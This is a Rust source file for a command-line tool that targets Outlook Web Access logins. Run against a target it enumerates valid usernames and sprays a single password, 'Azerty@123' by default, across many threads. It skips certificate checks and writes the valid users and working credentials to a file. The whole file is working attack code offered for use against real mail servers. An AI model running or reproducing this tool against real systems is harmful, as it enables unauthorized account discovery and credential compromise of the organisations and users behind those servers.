#![allow(dead_code, unused_variables, unused_imports)]
mod owa;

use std::fs::File;
use std::io::{self, BufRead, BufReader, Write};
use std::sync::{Arc, Mutex};
use owa_enum::{Color, err, log, msg};
use crate::owa::utils;
use reqwest::blocking::{Client};
use rayon::ThreadPoolBuilder;
use rayon::prelude::*;
use clap::Parser;

#[derive(Parser, Debug)]
struct Args {
    /// Target to attack
    #[arg(short, long)]
    target: String,

    /// Username to check or file containing usernames
    #[arg(short, long)]
    user: String,

    /// Password to use for authentication
    #[arg(short, long, default_value_t = String::from("Azerty@123"))]
    password: String,

    /// Target domain (optional) to connect with
    #[arg(short, long)]
    domain: Option<String>,

    /// Timeout to use for considering user does not exists
    #[arg(long, default_value_t = 3)]
    timeout: u64,

    /// The number of thread to use
    #[arg(long, default_value_t = 4)]
    threads_number: usize,

    /// Output valid users to a file
    #[arg(short, long)]
    output: Option<String>,
}

fn get_users(path: &str) -> io::Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);

    reader.lines().collect()
}

fn main() {
    let args = Args::parse();

    let pool = ThreadPoolBuilder::new()
                .num_threads(args.threads_number)
                .build()
                .expect("Failed to build thread pool");

    msg!("Using {} threads", Color::wrap(args.threads_number.to_string().as_str(), Color::YELLOW));

    let mut target = args.target;
    let mut users: Vec<String> = vec![(&args.user).to_string()];

    if !target.starts_with("http") {
        target = format!("https://{}", target);
    }

    msg!("Attacking {}", Color::wrap(&target, Color::BOLD));

    if let Ok(user_list) = get_users(&users[0]) {
        users = user_list;
        msg!("Checking on {} users", users.len());
    } else {
        msg!("Checking on single user: {}", Color::wrap(&users[0], Color::BOLD));
    }

    let client = Client::builder().danger_accept_invalid_certs(true)
                                  .timeout(std::time::Duration::from_secs(args.timeout))
                                  .redirect(reqwest::redirect::Policy::none())
                                  .build().expect("Help, cannot create a HTTP Client");

    let mut owa_enumerator = owa::utils::Owa::new(client, target, args.domain);
    let owa_auth: owa::utils::OwaAuthMethod = owa_enumerator.get_auth_method();

    if owa_auth == owa::utils::OwaAuthMethod::Unknown {
        err!("Unknown auth mode, are you sure the target is an OWA");
        return ();
    } else if owa_auth != owa::utils::OwaAuthMethod::Form {
        err!("Auth {} not supported", owa_auth);
        return ();
    }
    log!("Auth method in use: {}", Color::wrap(&owa_auth.to_string(), Color::YELLOW));

    match owa_enumerator.get_domain_name(){
        Ok(()) => msg!("Domain name {}", Color::wrap(&owa_enumerator.get_domain(), Color::CYAN)),
        Err(e) => {
            err!("Got {}", e);
            return ();
        }
    }

    let buffer = Arc::new(Mutex::new(String::new()));
    pool.install(|| {
        users.par_iter().for_each( |username| {
            match owa_enumerator.user_exists(&username, args.password.as_ref()) {
                owa::utils::OwaResult::PasswordValid => {
                    msg!("User {}:{} is valid", Color::wrap(&username, Color::CYAN), Color::wrap(args.password.as_ref(), Color::CYAN));
                    let mut buf = buffer.lock().unwrap();
                    buf.push_str(&format!("{}:{}\n", username, args.password));
                }
                owa::utils::OwaResult::UserExists => {
                    msg!("User {} exists", Color::wrap(&username, Color::CYAN));
                    let mut buf = buffer.lock().unwrap();
                    buf.push_str(&username);
                    buf.push('\n');
                }
                owa::utils::OwaResult::UserNotFound => err!("User {} does not exists", Color::wrap(&username, Color::BOLD)),
            }
        })
    });

    let final_result = buffer.lock().unwrap();
    if let Some(output) = args.output {
        if ! final_result.is_empty(){
            log!("Writting result to: {}", output);
            let mut file = File::create(output).expect("Failed to create file");
            file.write_all(final_result.as_bytes()).expect("Could not write result");
        }
    }
}
